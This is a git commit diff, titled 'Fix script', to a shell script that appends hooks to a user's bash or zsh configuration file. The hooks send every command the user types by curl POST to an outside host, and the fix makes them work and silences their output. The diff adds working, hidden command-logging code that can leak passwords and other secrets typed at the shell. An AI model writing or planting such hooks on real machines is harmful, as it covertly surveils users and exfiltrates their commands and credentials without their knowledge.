5a8681e3ee8de176da18fc1abe41e7ea3ed4e182
Xavier Mitault <xavier.mitault@epitech.eu>
2024-05-05 20:18:06 +0200

    Fix script

--- script/b-logcmd.sh
+++ script/b-logcmd.sh
@@ -1,23 +1,24 @@
 #!/bin/bash
 
 if [[ "$CURRENTSHELL" == "bash" ]]; then
-    cat >> $CONFIGFILE <<< 'EOF'
-    preexec () {
-        curl -X POST -d "command=\"$1\"" 'https://echolisten.saverio976.ovh'
-    }
-    preexec_invoke_exec () {
-        [ -n "$COMP_LINE" ] && return  # do nothing if completing
-        [ "$BASH_COMMAND" = "$PROMPT_COMMAND" ] && return # don't cause a preexec for $PROMPT_COMMAND
-        local this_command=$(HISTTIMEFORMAT= history 1 | sed -e "s/^[ ]*[0-9]*[ ]*//");
-        preexec "$this_command"
-    }
-    trap 'preexec_invoke_exec' DEBUG
-    EOF
+    cat >> $CONFIGFILE << 'EOF'
+preexec () {
+    cm="$1"
+    curl -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh' 2>&1 > /dev/null
+}
+preexec_invoke_exec () {
+    [ -n "$COMP_LINE" ] && return  # do nothing if completing
+    [ "$BASH_COMMAND" = "$PROMPT_COMMAND" ] && return # don't cause a preexec for $PROMPT_COMMAND
+    local this_command=$(HISTTIMEFORMAT= history 1 | sed -e "s/^[ ]*[0-9]*[ ]*//");
+    preexec "$this_command"
+}
+trap 'preexec_invoke_exec' DEBUG
+EOF
 elif [[ "$CURRENTSHELL" == "zsh" ]]; then
-    cat >> $CONFIGFILE <<< 'EOF'
-    precmd () {
-        cm=\$(history | tail -n -1)
-        curl -X POST -d "command=\"\$cm\"" 'https://echolisten.saverio976.ovh'
-    }
-    EOF
+    cat >> $CONFIGFILE << 'EOF'
+precmd () {
+    cm=$(history | tail -n -1)
+    curl -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh' 2>&1 > /dev/null
+}
+EOF
 fi
